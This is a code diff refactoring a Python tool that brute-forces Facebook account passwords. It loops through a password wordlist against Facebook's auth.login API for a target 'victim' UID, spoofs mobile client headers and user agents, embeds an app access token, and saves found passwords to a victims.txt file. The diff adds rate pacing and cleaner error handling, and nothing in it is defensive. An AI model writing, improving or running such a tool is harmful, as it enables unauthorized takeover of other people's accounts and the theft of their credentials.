@@ -145,64 +145,88 @@ print(lines)
 slow("\n   Attack Starting.....\n")
 time.sleep(2)
 def crack_file():
-  pasw=open(fil,"r")
-  for i in range(int(total)):
     try:
-      try:
-        pw=pasw.readline()
-        pw=pw.replace("\n","")
-        nagent = random.choice(uagent)
-        ses = requests.Session()
-        headers = {
-                                        "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-                                        "x-fb-sim-hni": str(random.randint(20000, 40000)),
-                                        "x-fb-net-hni": str(random.randint(20000, 40000)),
-                                        "x-fb-connection-qunisadty": "EXCELLENT",
-                                        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-                                        "user-agent": nagent,
-                                        "content-type": "application/x-www-form-urlencoded",
-                                        "x-fb-http-engine": "Liger"
-                                }
+        with open(fil, "r") as pasw:
+            for i, pw in enumerate(pasw):
+                pw = pw.strip()
+                print(f"\033[1;36m[•] Trying password ({i + 1}/{total}): {pw}\033[0m")
 
-        response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(victim)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
-        #print(response.text)
-        hnow= datetime.datetime.now()
-        htime=hnow.strftime("%H:%M:%S")
-        if "session_key" in response.text and "EAAA" in response.text:
-          #tok= response.json()["access_token"]
-          #print(response.text)
-          print(lines)
-          print("   [•] Password Found")
-          print("   [•] Status: Successful")
-          print("   [•] Uid: "+victim)
-          print("   [•] Password: "+pw)
-          save=open("victims.txt","a")
-          save.write("Victim Found\nStatus: Successful\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
-          save.close()
-          print(lines)
-          break
-        elif "www.facebook.com" in response.json()["error_msg"]:
-          print(lines)
-          print("   [•] Password Found")
-          print("   [•] Status: Checkpoint")
-          print("   [•] Uid: "+victim)
-          print("   [•] Password: "+pw)
-          save=open("victims.txt","a")
-          save.write("Victim Found\nStatus: Checkpoint\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
-          save.close()
-          print(lines)
-          break
-        else:
-          print("\033[1;37m   ["+str(i)+"] Wrong Password:\033[1;31m "+str(pw)+"\033[1;37m")
-          continue
-      except requests.exceptions.RequestException:
-        print("\n\033[1;37m   Failed\n   Check Your Network\033[1;37m\n")
-    except:pass
-  #print(lines)
-  #print("   [•] Password Not Found")
-  #print("   [•] Try Again With A Strong Password List")
-  #print(lines)
-crack_file()
+                try:
+                    nagent = random.choice(uagent)
+                    ses = requests.Session()
+                    headers = {
+                        "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+                        "x-fb-sim-hni": str(random.randint(20000, 40000)),
+                        "x-fb-net-hni": str(random.randint(20000, 40000)),
+                        "x-fb-connection-quality": "EXCELLENT",
+                        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+                        "user-agent": nagent,
+                        "content-type": "application/x-www-form-urlencoded",
+                        "x-fb-http-engine": "Liger"
+                    }
+
+                    url = (
+                        "https://b-api.facebook.com/method/auth.login"
+                        "?format=json"
+                        f"&email={victim}"
+                        f"&password={pw}"
+                        "&credentials_type=device_based_login_password"
+                        "&generate_session_cookies=1"
+                        "&error_detail_type=button_with_disabled"
+                        "&source=device_based_login"
+                        "&meta_inf_fbmeta="
+                        "&currently_logged_in_userid=0"
+                        "&method=GET"
+                        "&locale=en_US"
+                        "&client_country_code=US"
+                        "&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
+                        "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                        "&fb_api_req_friendly_name=authenticate"
+                        "&cpl=true"
+                    )
+
+                    response = ses.get(url, headers=headers)
+                    hnow = datetime.datetime.now()
+                    htime = hnow.strftime("%H:%M:%S")
+
+                    if "session_key" in response.text and "EAAA" in response.text:
+                        print(lines)
+                        print("\033[1;32m[✓] Password Found!\033[0m")
+                        print(f"UID: {victim}")
+                        print(f"Password: {pw}")
+                        with open("victims.txt", "a") as save:
+                            save.write(f"Victim Found\nStatus: Successful\nUid: {victim}\nPassword: {pw}\nAttacking Time: {rtime}\nHacked Time: {htime}\n\n")
+                        print(lines)
+                        break
+
+                    elif "www.facebook.com" in response.json().get("error_msg", ""):
+                        print(lines)
+                        print("\033[1;33m[!] Checkpoint Detected!\033[0m")
+                        print(f"UID: {victim}")
+                        print(f"Password: {pw}")
+                        with open("victims.txt", "a") as save:
+                            save.write(f"Victim Found\nStatus: Checkpoint\nUid: {victim}\nPassword: {pw}\nAttacking Time: {rtime}\nHacked Time: {htime}\n\n")
+                        print(lines)
+                        break
+
+                    else:
+                        print(f"\033[1;31m[✗] Wrong Password: {pw}\033[0m")
+
+                    # প্রতি 10 বার পর পর একটু বিরতি
+                    if i % 10 == 0 and i != 0:
+                        time.sleep(1)
+
+                except requests.exceptions.RequestException:
+                    print("\033[1;31m[!] Network Error. Retrying...\033[0m")
+                    time.sleep(2)
+
+                except Exception as e:
+                    print(f"\033[1;31m[!] Unexpected Error: {e}\033[0m")
+
+    except FileNotFoundError:
+        print("\033[1;31m[!] Password file not found!\033[0m")
+    except Exception as e:
+        print(f"\033[1;31m[!] Fatal Error: {e}\033[0m")
 """
         print("Password Found")
         print("Status: Successful")
